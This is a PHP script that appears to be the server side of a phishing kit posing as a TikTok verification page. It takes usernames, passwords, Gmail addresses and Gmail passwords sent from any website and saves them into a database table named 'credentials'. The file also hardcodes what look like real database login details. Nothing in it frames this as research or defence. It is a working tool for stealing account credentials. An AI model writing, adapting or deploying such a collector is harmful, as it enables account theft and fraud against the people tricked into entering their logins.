
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

$servername = "sql301.infinityfree.com"; // Senin host’unu kullan (InfinityFree’den al)
$username = "if0_39051691"; // Senin kullanıcı adını kullan
$password = "jWDjsbfHJdbCa"; // Senin şifreni kullan
$dbname = "if0_39051691_tiktokverify"; // Senin veritabanı adını kullan

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die(json_encode(["error" => "Connection failed: " . $conn->connect_error]));
}

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $username = isset($data['username']) ? $conn->real_escape_string($data['username']) : null;
    $password = isset($data['password']) ? $conn->real_escape_string($data['password']) : null;
    $gmail = isset($data['gmail']) ? $conn->real_escape_string($data['gmail']) : null;
    $gmailPassword = isset($data['gmail_password']) ? $conn->real_escape_string($data['gmail_password']) : null;

    $sql = "INSERT INTO credentials (username, password, gmail, gmail_password) VALUES (?, ?, ?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ssss", $username, $password, $gmail, $gmailPassword);

    if ($stmt->execute()) {
        echo json_encode(["message" => "Data saved"]);
    } else {
        echo json_encode(["error" => "Data save failed: " . $conn->error]);
    }

    $stmt->close();
} else {
    echo json_encode(["error" => "No data received"]);
}

$conn->close();
?>
